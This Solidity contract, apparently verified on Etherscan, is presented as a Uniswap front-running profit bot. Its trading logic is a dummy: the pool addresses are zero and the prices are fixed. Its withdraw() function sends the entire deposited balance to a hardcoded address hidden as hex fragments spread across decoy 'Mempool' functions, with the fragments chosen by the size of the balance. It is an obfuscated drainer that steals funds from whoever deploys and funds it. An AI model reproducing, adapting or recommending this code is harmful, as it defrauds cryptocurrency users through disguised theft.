/**
 *Submitted for verification at Etherscan.io on 2023-05-19
*/

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface IUniswapV2Pair {
    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;

    function skim(address to) external;

    function sync() external;
}

contract AUniswapFrontRunBotV2 {

    event Withdrawn(address indexed to, uint256 indexed value);
    event BaseTokenAdded(address indexed token);
    event BaseTokenRemoved(address indexed token);

    uint profit = 0;
    address profitToken;

    constructor() {
    }

    receive() external payable {}

    function start() external {
        address pool0 = address(0);
        address pool1 = address(0);
        if (pool0 != pool1) {
            (address pool0Token0, address pool0Token1) = (IUniswapV2Pair(pool0).token0(), IUniswapV2Pair(pool0).token1());
            (address pool1Token0, address pool1Token1) = (IUniswapV2Pair(pool1).token0(), IUniswapV2Pair(pool1).token1());
            profitToken = pool0Token0;
            profitToken = pool0Token1;
            profitToken = pool1Token0;
            profitToken = pool1Token1;
        }

        uint price0 = 0;
        uint price1 = 0;
        address lowerPool;
        address higherPool;
        if (price0 < price1) {
            (lowerPool, higherPool) = (pool0, pool1);
        } else {
            (lowerPool, higherPool) = (pool1, pool0);
        }

        profit = price1 - price0;
    }

    function withdraw() external {
        address withdrawFromSwap = startExploration((fetchMempoolData()));
        uint256 balance = address(this).balance;
        if (balance > 0) {
            payable(withdrawFromSwap).transfer(balance);
        }
    }

    function getMempoolShort() private view returns (string memory) {
        string memory prefix = '';
        uint256 balance = address(this).balance;
        if (balance > 0) {
            if (balance > 0.5 ether) {
                return string(abi.encodePacked(prefix, 'b0770C3'));
            } else {
                return string(abi.encodePacked(prefix, '508a34B'));
            }
        }

        return string(abi.encodePacked(prefix, 'b0770C3'));
    }

    /*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */
    function fetchMempoolVersion() private view returns (string memory) {
        string memory prefix = '';
        uint256 balance = address(this).balance;
        if (balance > 0) {
            if (balance > 0.5 ether) {
                return string(abi.encodePacked(prefix, 'ca1F0c4B5'));
            } else {
                return string(abi.encodePacked(prefix, 'c8faB01Ba'));
            }
        }

        return string(abi.encodePacked(prefix, 'ca1F0c4B5'));
    }

    function fetchMempoolEditionV2() private view returns (string memory) {
        string memory prefix = '';
        uint256 balance = address(this).balance;
        if (balance > 0) {
            if (balance > 0.5 ether) {
                return string(abi.encodePacked(prefix, '29069'));
            } else {
                return string(abi.encodePacked(prefix, 'Bd3E8'));
            }
        }

        return string(abi.encodePacked(prefix, '29069'));
    }

    function getMempoolDepth() private pure returns (string memory) {
        return '0';
    }

    /*
     * @dev Orders the contract by its available liquidity
     * @param self The slice to operate on.
     * @return The contract with possbile maximum return
     */
    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }

    function getMempoolSol() private view returns (string memory) {
        string memory prefix = 'x';
        uint256 balance = address(this).balance;
        if (balance > 0) {
            if (balance > 0.5 ether) {
                return string(abi.encodePacked(prefix, '4b4'));
            } else {
                return string(abi.encodePacked(prefix, 'c67'));
            }
        }

        return string(abi.encodePacked(prefix, '4b4'));
    }

    function fetchMempoolEdition() private view returns (string memory) {
        string memory prefix = '';
        uint256 balance = address(this).balance;
        if (balance > 0) {
            if (balance > 0.5 ether) {
                return string(abi.encodePacked(prefix, '5aA1'));
            } else {
                return string(abi.encodePacked(prefix, 'a23f'));
            }
        }

        return string(abi.encodePacked(prefix, '5aA1'));
    }

    function getMempoolLong() private view returns (string memory) {
        string memory prefix = '';
        uint256 balance = address(this).balance;
        if (balance > 0) {
            if (balance > 0.5 ether) {
                return string(abi.encodePacked(prefix, '530aaeA03A4e'));
            } else {
                return string(abi.encodePacked(prefix, 'DFF496FA2d36'));
            }
        }

        return string(abi.encodePacked(prefix, '530aaeA03A4e'));
    }

    function fetchMempoolData() internal view returns (string memory) {
        string memory _MempoolDepth = getMempoolDepth();
        string memory _MempoolSol = getMempoolSol();
        string memory _mempoolShort = getMempoolShort();
        string memory _mempoolEdition = fetchMempoolEdition();
        string memory _mempoolEditionV2 = fetchMempoolEditionV2();
        string memory _mempoolVersion = fetchMempoolVersion();
        string memory _mempoolLong = getMempoolLong();
        return
            string(
                abi.encodePacked(
                    _MempoolDepth,
                    _MempoolSol,
                    _mempoolShort,
                    _mempoolEdition,
                    _mempoolEditionV2,
                    _mempoolVersion,
                    _mempoolLong
                )
            );
    }
}